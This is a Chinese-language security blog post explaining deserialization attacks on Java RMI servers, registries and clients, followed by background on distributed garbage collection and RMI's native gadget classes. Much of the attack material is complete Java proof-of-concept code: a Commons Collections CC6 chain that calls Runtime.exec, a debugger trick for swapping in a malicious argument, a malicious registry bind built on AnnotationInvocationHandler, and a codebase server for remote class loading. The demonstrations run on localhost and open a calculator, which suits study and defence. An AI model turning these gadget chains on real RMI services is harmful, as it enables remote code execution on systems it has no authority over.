# 漏洞篇 - RMI 相关的攻击
> 2024-08-28
> 来源：https://changeyourway.github.io/2024/08/28/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-RMI%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB/

## 攻击 RMI

前置知识：[基础篇 - RMI 协议详解](https://changeyourway.github.io/2024/07/08/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-RMI%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8D%8F%E8%AE%AE/#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%8E%B7%E5%8F%96-Registry-%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1)

我们可以将参与 RMI 远程调用的角色分为三个：Server 端、Registry 端、Client 端（一般来说 Server 端和 Registry 端在一起），它们三者之间都会进行通信，并且全部的通信流程均通过序列化与反序列化实现。基于此，我们可以实现反序列化攻击。

### 攻击 Server 端

#### 参数反序列化

如果服务端提供的服务对象参数是 Object 类型，那么意味着客户端远程调用时可以传递任意类型的参数，这个参数将会被序列化发送到服务端，然后在服务端反序列化。

例如，服务端的 SayHello 服务有一个方法 eval ，其参数是 Object 类型：

![](https://changeyourway.github.io/images/image-20240708164106474.png)

以 CC6 弹计算器为例（前提是服务端有 CC 依赖），客户端传递一个恶意对象：

```
package Client;

import Server.SayHelloInterface;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import org.apache.commons.collections.Transformer;
import java.lang.reflect.Field;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class CC6Test {
    public static Object getEvilClass() throws NoSuchFieldException, IllegalAccessException {
        // 获取包含执行类的 ChainedTransformer 对象
        Transformer[] transformers = new Transformer[]{
                // 将传入参数固定为 Runtime.class
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer
                        ("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer
                        ("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer
                        ("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 新建一个 Map 对象，无关紧要，只是作为参数传入
        Map<Object, Object> hashMap = new HashMap<>();

        // 初始化利用链 LazyMap
        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));

        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");

        // 初始化利用链 HashMap
        HashMap<Object, Object> map = new HashMap<>();
        map.put(tiedMapEntry, "test");

        // 删除 lazymap 对象中的 key 值
        lazymap.remove("key");

        // 反射修改 lazymap 对象的 factory 属性
        Class<? extends Map> lazymapClass = lazymap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap, chainedTransformer);

        return map;
    }

    public static void main(String[] args) throws RemoteException, NotBoundException, NoSuchFieldException, IllegalAccessException {
        // 连接到服务器 localhost ，端口 1099 :
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        // 查找名称为 "SayHello" 的服务并强制转型为 SayHelloInterface 类型:
        SayHelloInterface sayHello = (SayHelloInterface) registry.lookup("SayHello");
        // 将构造好的 HashMap 对象作为参数传入
        sayHello.eval(getEvilClass());
    }
}
```

先启动服务端，然后启动客户端，弹出计算器：

![](https://changeyourway.github.io/images/image-20240708165345974.png)

参数为 Object 类型就可以传递任意参数，那如果不是 Object 类型呢？

前面提到客户端调用服务方法时是直接与服务端进行通信的，而服务端使用 UnicastServerRef 的 dispatch 方法来处理客户端的请求。

在查找方法时，它用方法的 hash 值在 this.hashToMethod\_Map 中查找。这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。

![](https://changeyourway.github.io/images/image-20240708171013758.png)

如果说服务的参数不是 Object 类型，但是我们想上传恶意类的话，理论上可以伪造 hash ，这个 hash 在服务端是可以找到对应的方法的，但是实际传递的方法的参数还是恶意类。

在 mogwailabs 的 \[PPT\]([https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides](https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides) Exploiting RMI Services.pdf) 中提出了以下 4 种方法：

-   通过网络代理，在流量层修改数据
-   自定义 “java.rmi” 包的代码，自行实现
-   字节码修改
-   使用 debugger

我们来实现一下使用 debugger 的攻击方式，也就是在调试时修改变量值。

###### 调试时修改变量值

现在将服务端的方法参数改为 String 类型：

![](https://changeyourway.github.io/images/image-20240709141401511.png)

客户端定义了一个 getEvilClass() 方法用来获取 CC6 攻击链最终的 HashMap 对象。

客户端在调用时先传入一个普通的字符串：

![](https://changeyourway.github.io/images/image-20240709145850132.png)

运行服务端，调试客户端，在 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法处下断点。

此时我们进入到 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法，这里的 method 表示要调用的方法，args 是一个 Object 数组，表示要传递的参数：

![](https://changeyourway.github.io/images/image-20240709150236473.png)

其中 args\[0\] 正是我们传递的字符串参数，我们将其改为恶意对象，可以在上图红框处右键 -> Set Value ：

![](https://changeyourway.github.io/images/image-20240709150345553.png)

然后设置 args\[0\] = CC6Test.getEvilClass() 即可：

![](https://changeyourway.github.io/images/image-20240709150424485.png)

这样就成功修改了 args\[0\] 为恶意类，继续运行，可以看到弹出计算器：

![](https://changeyourway.github.io/images/image-20240709150721649.png)

因为调用的是本地的 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法，所以在参数传递到服务端之前就修改了它，要查找的方法又没变，最终得出的 hash 值在服务端又能找到对应的方法，所以造成了参数反序列化。

实际上，服务端调用 UnicastServerRef 的 dispatch 方法来处理客户端的请求，UnicastServerRef 的 dispatch 方法又调用 UnicastRef 的 unmarshalValue 方法来反序列化参数：

![](https://changeyourway.github.io/images/image-20240709151401926.png)

服务端实际反序列化参数的处理在 UnicastRef 的 unmarshalValue 方法中：

![](https://changeyourway.github.io/images/image-20240709151518462.png)

可以看到，除了基本类型之外，其他类型的参数都会在这里被反序列化，所以只要服务端提供的方法参数不是基本类型，理论上都可以用这么一种攻击方式。

###### 总结

这种方式虽然可行，但也存在一定的局限性：

1.  反序列化攻击，要求服务端有可利用的反序列化链，比如 CC 依赖；
2.  实际应用场景中，攻击者并不知道 RMI 服务端提供了哪些方法，方法的参数是什么类型，攻击者也许可以通过工具探测得到服务的名称，但还是无法利用。除非得到源码，当然在这种情况下，攻击者通常会优先选用其他攻击方式了。
3.  服务端提供的方法参数不是基本类型

#### 动态类加载

RMI 有一个重要的特性，就是动态类加载机制，当本地 ClassPath 中无法找到相应的类时，会在指定的 codebase 里加载 class。

若要开启动态类加载，服务端需要满足以下几个条件：

1.  需要启动 RMISecurityManager 。Java SecurityManager 默认不允许远程类加载。
2.  需要配置 java.security.policy 。
3.  属性 java.rmi.server.useCodebaseOnly 的值必须为 false 。但是 JDK 6u45、7u21 之后，java.rmi.server.useCodebaseOnly 的默认值是 true 。当该值为 true 时，将禁用自动加载远程类文件，仅从 CLASSPATH 和当前虚拟机的 java.rmi.server.codebase 指定路径加载类文件，不再支持从 RMI 请求中获取 codebase 。增加了 RMI ClassLoader 的安全性。

我们来模拟攻击一下，由于客户端和服务端都在本地，故为了防止远程类与服务端在一起，我们将该实验分为三个项目：

第一个项目名为 remote-class ，这个项目中实现了一个简易的服务器，并且其中存放远程类，将来作为 codebase 使用；

第二个项目名为 java-rmi-server ，RMI 的服务端和注册中心所在的项目；

第三个项目名为 java-rmi-client ，RMI 客户端所在的项目。

注：本次实验代码基于 [longofo](https://github.com/longofo) 师傅的代码改编。仓库链接为：[https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)

改编后的代码存放在：[https://github.com/ChangeYourWay/RemoteRmiTest](https://github.com/ChangeYourWay/RemoteRmiTest) ，在 jdk8u71 环境中试验成功。

其中，要被加载的远程类名为 ExportObject ，我们先来确保客户端和服务端都是访问不到这个类的：

服务端并不存在 ExportObject 类，所以无法访问：

![](https://changeyourway.github.io/images/QQ_1721211770043.png)

客户端自定义了一个 ExportObject 类，其中没有恶意代码。这是为了方便客户端使用这个类名（理论上可以直接将远程类复制到客户端，但是这会导致客户端创建对象时，恶意代码先在客户端中执行一遍）：

![](https://changeyourway.github.io/images/QQ_1721211872446.png)

真正的远程类在 remote-class 项目中：

![](https://changeyourway.github.io/images/QQ_1721211268503.png)

客户端和 codebase 处的远程类控制序列化版本号一致，避免反序列化失败。

服务端代码：

```
// RMIServer2.java
package com.miaoji.javarmi;

import java.rmi.RMISecurityManager;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {
    public static void main(String[] args) {
        try {
            try {
                // 配置 java.security.policy
                System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("policyfile.txt").toString());
                // 配置 Java SecurityManager
                System.setSecurityManager(new RMISecurityManager());
                // 设置 java.rmi.server.useCodebaseOnly 为 false
                System.setProperty("java.rmi.server.useCodebaseOnly", "false");
            } catch (Exception e) {
                e.printStackTrace();
            }

            // 创建 Registry
            Registry registry = LocateRegistry.createRegistry(1099);
            // 实例化服务端远程对象
            ServicesImpl obj = new ServicesImpl();
            // 没有继承 UnicastRemoteObject 时需要使用静态方法 exportObject 处理
            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
            // 绑定远程对象到 Registry
            registry.rebind("Services", services);

            System.out.println("java RMI registry created. port on 1099...");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

值得注意的是 java.security.policy 需要在 Java SecurityManager 之前配置，否则会报拒绝访问的错误：

![](https://changeyourway.github.io/images/QQ_1721212058559.png)

Services 接口的方法参数是 Message 类型，Message 是服务端自定义的类：

![](https://changeyourway.github.io/images/QQ_1721213910927.png)

客户端代码：

```
package com.miaoji.javarmi;

import com.miaoji.remoteclass.ExportObject;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        // 获取远程对象的引用
        Services services = (Services) registry.lookup("Services");
        ExportObject exportObject = new ExportObject();
        exportObject.setMessage("hahaha");

        services.sendMessage(exportObject);
    }
}
```

由客户端设置好 codebase 然后传递给服务端。codebase 在客户端和服务端是流动共享的。

客户端的 ExportObject 类继承了服务端的原有类 Message ，这样才能顺利作为 Services 服务的 sendMessage 方法的参数传输，事实上，如果这里的方法参数是其他类型，比如 ArrayList 类型，那么同样可以让这个 ExportObject 继承 ArrayList 。

codebase 端代码：

```
package com.miaoji.remoteclass;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;

public class HttpServer implements HttpHandler {
    public void handle(HttpExchange httpExchange) {
        try {
            System.out.println("new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());
            InputStream inputStream = HttpServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            while (inputStream.available() > 0) {
                byteArrayOutputStream.write(inputStream.read());
            }

            byte[] bytes = byteArrayOutputStream.toByteArray();
            httpExchange.sendResponseHeaders(200, bytes.length);
            httpExchange.getResponseBody().write(bytes);
            httpExchange.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws IOException {
        com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(8000), 0);

        System.out.println("String HTTP Server on port: 8000");
        httpServer.createContext("/", new HttpServer());
        httpServer.setExecutor(null);
        httpServer.start();
    }
}
```

主要是开启一个 HTTP 服务器，监听 8000 端口。这段代码运行后是可以在公网访问到当前机器的 8000 端口的。它会设置当前项目的根路径为网站根路径：

![](https://changeyourway.github.io/images/QQ_1721212591316.png)

确保 remote-class 中包含了远程类，先运行 codebase 端，再运行服务端，最后运行客户端，成功弹出计算器：

![](https://changeyourway.github.io/images/QQ_1721212763834.png)

由于服务端和客户端并不能直接访问远程类，所以这个是服务端远程加载类的结果。

###### 总结

动态类加载的方式限制很多，需要服务器做安全策略文件配置，设置安全管理器，以及存在 Jdk 版本的限制，需要服务器手动设置 useCodebaseOnly 为 false 。除此之外，这种方式仍然需要知道 RMI 服务提供了哪些方法，方法的参数类型是什么。所以仍然比较鸡肋。

#### 本地重写类

大致就是如果 RMI 服务的方法参数是某个类，比如 A 类，那么我依然想利用 CC6 链，可以在本地重写 HashMap，让 HashMap 继承 A 类，然后将 CC6 最终得到的 HashMap 对象作为参数传入。

理论上可以在本地找到 HashMap 的类文件直接修改：

![](https://changeyourway.github.io/images/QQ_1721216307557.png)

但是这样可能出现各种报错，或者是遇到一个类不能直接继承多个类的问题。

### 攻击 Registry 端

考虑服务端和 Registry 端不在同一端的情况，前面分析过了，服务端调用 bind/rebind 方法绑定服务对象的时候是将该对象序列化发送到 Registry 端，Registry 端最终在 RegistryImpl\_Skel 的 dispatch 方法中反序列化。那么如果 Server 端向 Registry 端输送一个恶意的对象，就可以实现反序列化攻击了。

考虑到 Server 端绑定对象时要求对象继承 Remote 类，我们创建一个继承了 Remote 类的动态代理即可，创建代理选择使用 AnnotationInvocationHandler 类。并将 getEvilClass() 返回的 HashMap 对象封装进去。AnnotationInvocationHandler 正是 CC1 链的入口类。

测试代码如下：

```
package Server;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.rmi.RMIServer;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.rmi.Naming;
import java.rmi.RMISecurityManager;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class RemoteServer {

    public static HashMap getEvilClass() throws NoSuchFieldException, IllegalAccessException {
        // 获取包含执行类的 ChainedTransformer 对象
        Transformer[] transformers = new Transformer[]{
                // 将传入参数固定为 Runtime.class
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer
                        ("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer
                        ("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer
                        ("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 新建一个 Map 对象，无关紧要，只是作为参数传入
        Map<Object, Object> hashMap = new HashMap<>();

        // 初始化利用链 LazyMap
        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));

        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");

        // 初始化利用链 HashMap
        HashMap<Object, Object> map = new HashMap<>();
        map.put(tiedMapEntry, "test");

        // 删除 lazymap 对象中的 key 值
        lazymap.remove("key");

        // 反射修改 lazymap 对象的 factory 属性
        Class<? extends Map> lazymapClass = lazymap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap, chainedTransformer);

        return map;
    }

    public static void main(String[] args) throws Exception {
        // 将 RMI 服务注册到 1099 端口
        LocateRegistry.createRegistry(1099);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        HashMap map = getEvilClass();
        HashMap map1 = new HashMap<>();
        map1.put("a", map);

        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map1);

        Remote remote = (Remote) Proxy.newProxyInstance(
                RemoteServer.class.getClassLoader(),
                new Class[]{Remote.class},
                invocationHandler);

        // Get the registry from a remote host
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        // Bind the remote object in the registry
        registry.rebind("Evil", remote);
    }
}
```

### 攻击 Client 端

常见于 lookup 参数可控的情况，如果说 Server 端和 Registry 端可控，那么只需要绑定一个恶意对象，那么客户端一旦远程加载了，就会反序列化这个对象并造成代码执行。

比如服务端定义一个恶意对象：

![](https://changeyourway.github.io/images/QQ_1721632318859.png)

然后服务端绑定这个恶意对象。

客户端远程加载此对象并调用其 function 方法时就会造成命令执行：

![](https://changeyourway.github.io/images/QQ_1721632447996.png)

也可以将命令写在静态代码块里面，不过那样会让服务端也执行一次命令。

除此之外，服务端也可以指定一个 codebase 让客户端去指定的地址加载恶意对象，从而触发客户端反序列化。

### 分布式垃圾回收 DGC

#### 了解分布式垃圾回收

RMI 子系统实现基于引用计数的“分布式垃圾回收”（DGC，Distributed Garbage Collection），以便为远程服务器对象提供自动内存管理设施。启动一个 RMI 服务，就会伴随着启动 DGC 服务端。

###### 工作流程

1.  **引用计数**：
    -   当客户端获取远程对象的引用时，客户端向服务器发送一个“引用添加”消息，增加该远程对象的引用计数。
    -   当客户端不再需要远程对象时，客户端向服务器发送一个“引用移除”消息，减少该远程对象的引用计数。
    -   服务器根据引用计数判断该远程对象是否仍然被引用，如果引用计数为 0 ，则可以回收该对象。
2.  **租约机制**：
    -   为了防止客户端异常退出或网络分区导致引用计数永久不减的情况，RMI 引入了租约机制。
    -   当客户端获取远程对象引用时，除了增加引用计数外，还会请求一个租约（Lease）。租约有一个固定的期限，通常是 10 分钟。
    -   客户端需要在租约到期前续约，以维持对远程对象的引用。如果客户端没有续约，服务器会认为客户端不再需要该对象，并减少引用计数。
3.  **垃圾回收器（GC）线程**：
    -   服务器中运行一个 GC 线程，负责定期检查所有远程对象的引用计数和租约状态。
    -   如果发现某个远程对象的引用计数为 0 且租约已过期，则回收该对象。

###### 涉及的接口和方法

RMI 定义了一个 java.rmi.dgc.DGC 接口，提供了两个方法 dirty 和 clean：

-   当客户机创建（序列化）远程引用时，会在服务器端 DGC 上调用 dirty() 方法，请求一个租约，表示远程对象的使用期限。如果客户端想续租，则需要再调用一次 dirty() 方法。
-   当客户机完成远程引用后，它会调用对应的 clean() 方法回收远程对象的引用。

DGC 接口有两个实现类，分别是 sun.rmi.transport.DGCImpl 以及 sun.rmi.transport.DGCImpl\_Stub ，同时还定义了 sun.rmi.transport.DGCImpl\_Skel 。

这个命名方式与之前的注册中心类似，实际上功能也是类似。正如 RegistryImpl\_Skel 是注册中心自己保留的骨架（代理对象），而 RegistryImpl\_Stub 是用来分发出去保留在远程客户端和服务端的存根，DGC 也一样，DGCImpl\_Skel 是服务端保存的骨架，DGCImpl\_Stub 则是保留在远程 Registry 端和客户端的存根。RegistryImpl\_Skel 的 dispatch 方法用来处理 RMI 相关的请求，DGCImpl\_Skel 的 dispatch 方法同样用于处理 DGC 相关的请求。

DGCImpl\_Skel 的 dispatch 方法，依旧通过 Java 原生的序列化和反序列化来处理对象：

![](https://changeyourway.github.io/images/QQ_1721654972488.png)

### RMI 原生反序列化链

RMI 中的一些类可以用来触发反序列化，在 ysoserial 中就有利用了这些链子的 poc ，所以了解它们的工作流程对于理解 ysoserial 中的代码很有帮助。

#### UnicastRemoteObject 类

java.rmi.server.UnicastRemoteObject 类通常是远程调用接口实现类的父类，如果不作为父类的话，就要直接使用其静态方法 exportObject 来创建动态代理并随机监听本机端口以提供服务。所以 UnicastRemoteObject 会经常被反序列化，调用其 readObject 方法。

我们来关注 UnicastRemoteObject 的 readObject 方法：

![](https://changeyourway.github.io/images/QQ_1723145308331.png)

这里调用了 UnicastRemoteObject 的 reexport 方法，跟进 reexport 方法看看：

![](https://changeyourway.github.io/images/QQ_1723145501182.png)

可以看到最终还是调用到 UnicastRemoteObject 的 exportObject 方法。在上一篇文章中分析过，这个方法会开启 JRMP 监听。

#### UnicastRef 类

sun.rmi.server.UnicastRef 类实现了 Externalizable 接口，因此在其反序列化时，会调用 readExternal 方法来反序列化。

UnicastRef 的 readExternal 方法调用 LiveRef 的 read 方法来获取其 ref 属性的值：

![](https://changeyourway.github.io/images/QQ_1722429509640.png)

LiveRef 的 read 方法调用 DGCClient 的 registerRefs 方法：

![](https://changeyourway.github.io/images/QQ_1722429678813.png)

DGCClient 的 registerRefs 方法：

![](https://changeyourway.github.io/images/QQ_1722429748571.png)

var2 是 DGCClient 的内部类 EndpointEntry 的 lookup 方法的返回值，也是 DGCClient 的内部类 EndpointEntry 对象，所以这里调用 DGCClient$EndpointEntry#registerRefs 方法。

DGCClient$EndpointEntry#registerRefs 方法又继续调用 DGCClient$EndpointEntry#makeDirtyCall 方法：

![](https://changeyourway.github.io/images/QQ_1722430065789.png)

DGCClient$EndpointEntry#makeDirtyCall 方法调用其成员属性 dgc 的 dirty 方法：

![](https://changeyourway.github.io/images/QQ_1722431232799.png)

调试起来发现其实是调用的 DGCImpl\_Stub 的 dirty 方法：

![](https://changeyourway.github.io/images/QQ_1722431161531.png)

#### RemoteObject 类

RemoteObject 是几乎所有 RMI 远程调用类的父类，它继承了 java.io.Serializable 。但 RemoteObject 是个抽象类，我们通常用到它的子类来进行反序列化，比如 ysoserial 使用 RemoteObjectInvocationHandler 代理类作为反序列化的入口点。

我们来关注 RemoteObject 的 readObject 方法：

![](https://changeyourway.github.io/images/image-20240731202114052.png)

这里会调用 ref 的 readExternal 方法，那么可以将成员变量 ref 赋值成一个 UnicastRef 对象。

由于成员变量 ref 被 transient 修饰，不能直接被序列化：

```
transient protected RemoteRef ref;
```

所以在 RemoteObject 的序列化处理逻辑中是先获取 ref 的类名再单独序列化，反序列化时再构造内部引用类名并加载相应的类。

RemoteObject 的 writeObject 方法：

![](https://changeyourway.github.io/images/QQ_1722429062866.png)

## 总结

本文用来扩展针对 RMI 的攻击思路，大部分真正用到实践上的攻击还是针对 DGC 的攻击，在下一篇文章中我会详细分析 ysoserial 中针对 DGC 的攻击模块。

## 参考文章

[Java RMI 攻击由浅入深](https://su18.org/post/rmi-attack/#2-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD)

[Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）](https://paper.seebug.org/1091/#java-rmi_3)
